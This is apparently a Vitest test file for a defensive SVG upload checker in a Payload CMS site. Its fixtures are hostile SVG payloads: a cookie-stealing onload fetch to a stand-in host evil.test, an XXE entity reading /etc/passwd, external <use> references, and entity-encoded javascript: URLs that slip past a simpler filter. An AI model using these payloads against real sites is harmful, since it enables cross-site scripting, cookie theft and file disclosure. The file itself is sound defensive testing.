import { describe, expect, it } from 'vitest'

import { findSvgThreats, isSvgUpload } from '@/lib/svgSafety'

/** Shape of a real wordmark export, trimmed. Every fixture builds on this. */
const CLEAN = `<svg width="226" height="54" viewBox="0 0 226 54" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M225.909 31.3735H210.509C210.82 34.9421 213.224 36.6876 215.785 36.6876Z" fill="#0B4645"/></svg>`

describe('findSvgThreats', () => {
  it('passes a plain wordmark', () => {
    expect(findSvgThreats(CLEAN)).toEqual([])
  })

  it.each([
    ['<script> element', `<svg><script>alert(1)</script></svg>`],
    ['self-closing script', `<svg><script src="//evil.test/x.js"/></svg>`],
    ['spaced tag name', `<svg>< script >alert(1)</script></svg>`],
    ['uppercase tag', `<svg><SCRIPT>alert(1)</SCRIPT></svg>`],
    ['onload handler', `<svg onload="fetch('//evil.test?c='+document.cookie)"></svg>`],
    ['onclick on a child', `<svg><circle r="5" onclick="alert(1)"/></svg>`],
    ['spaced-out handler', `<svg onload = "alert(1)"></svg>`],
    ['foreignObject', `<svg><foreignObject><body>hi</body></foreignObject></svg>`],
    ['javascript: url', `<svg><a href="javascript:alert(1)"><text>x</text></a></svg>`],
    ['entity declaration', `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg/>`],
  ])('rejects %s', (_label, source) => {
    expect(findSvgThreats(source).length).toBeGreaterThan(0)
  })

  it('reports every distinct problem, not just the first', () => {
    const threats = findSvgThreats(`<svg onload="a()"><script>b()</script><foreignObject/></svg>`)
    expect(threats).toHaveLength(3)
  })

  // The rules run over raw text, so the risk is not just missing an attack —
  // it is blocking a legitimate wordmark and getting the check disabled.
  describe('does not fire on legitimate artwork', () => {
    it.each([
      ['a class value beginning with "on"', `<svg><g class="online-badge"/></svg>`],
      ['a word containing "on" mid-value', `<svg><g id="button-on-hover"/></svg>`],
      ['prose containing "on ... ="', `<svg><title>toggle on = bright</title></svg>`],
      ['a gradient with stops', `<svg><linearGradient><stop offset="0" stop-color="#000"/></linearGradient></svg>`],
      ['a font-family declaration', `<svg><text font-family="Inter" font-weight="600">Mento</text></svg>`],
      ['an https link that is not a script', `<svg xmlns="http://www.w3.org/2000/svg"><desc>https://mento.vc</desc></svg>`],
      // The `<use>` rule has to tell these two apart or it breaks real artwork:
      // referencing a shape defined elsewhere in the same file is ordinary SVG
      // and appears in exported wordmarks.
      ['a <use> referencing a shape in the same file', `<svg><defs><path id="m"/></defs><use href="#m"/></svg>`],
      ['a <use> with the xlink namespace, still internal', `<svg><use xlink:href="#mark"/></svg>`],
      ['an entity that is not an encoded character', `<svg><title>Smith &amp; Sons</title></svg>`],
    ])('%s', (_label, source) => {
      expect(findSvgThreats(source)).toEqual([])
    })
  })

  /**
   * These three are the reason this module still exists. Payload 3.88 screens
   * SVG uploads itself and runs first, so anything it catches never reaches
   * here — verified 2026-08-31 by pushing fifteen attack shapes through both.
   * What follows is the set Payload's `validateSvg` misses.
   */
  describe('covers the gaps in Payload\'s own validateSvg', () => {
    it('rejects a <use> pointing at another document', () => {
      // Script will not execute — media responses carry script-src 'none' — but
      // the fetch still reports the viewer to a third party and pulls unreviewed
      // markup into a file we serve.
      expect(findSvgThreats(`<svg><use href="https://evil.example/x.svg#p"/></svg>`)).toEqual([
        'a <use> element pointing outside the file',
      ])
    })

    it('rejects a <use> pointing outside via xlink:href', () => {
      expect(findSvgThreats(`<svg><use xlink:href="//evil.example/x.svg#p"/></svg>`)).toHaveLength(1)
    })

    it('rejects a <handler> element', () => {
      // SVG Tiny 1.2 scripting. No current browser runs it, which is why nothing
      // else screens for it — and why a wordmark carrying one is not an accident.
      expect(findSvgThreats(`<svg><handler type="text/javascript">a()</handler></svg>`)).toEqual([
        'a <handler> element',
      ])
    })

    it('rejects javascript: hidden behind an HTML entity', () => {
      // Payload matches the literal string, so an encoded `j` walks past it.
      const threats = findSvgThreats(`<svg><a href="&#106;avascript:alert(1)">x</a></svg>`)
      expect(threats).toContain('an entity-encoded character in a URL (obfuscated javascript:)')
    })

    it('rejects the hex form of the same trick', () => {
      const threats = findSvgThreats(`<svg><a href="&#x6a;avascript:alert(1)">x</a></svg>`)
      expect(threats).toContain('an entity-encoded character in a URL (obfuscated javascript:)')
    })
  })
})

describe('isSvgUpload', () => {
  it('matches on the mimetype Payload reports', () => {
    expect(isSvgUpload('image/svg+xml', 'logo.svg')).toBe(true)
  })

  it('matches a .svg name even when the mimetype is wrong', () => {
    // A client that mislabels the type must not slip past the check.
    expect(isSvgUpload('application/octet-stream', 'logo.SVG')).toBe(true)
  })

  it('ignores raster uploads', () => {
    expect(isSvgUpload('image/png', 'team-alex.png')).toBe(false)
    expect(isSvgUpload(undefined, undefined)).toBe(false)
  })
})
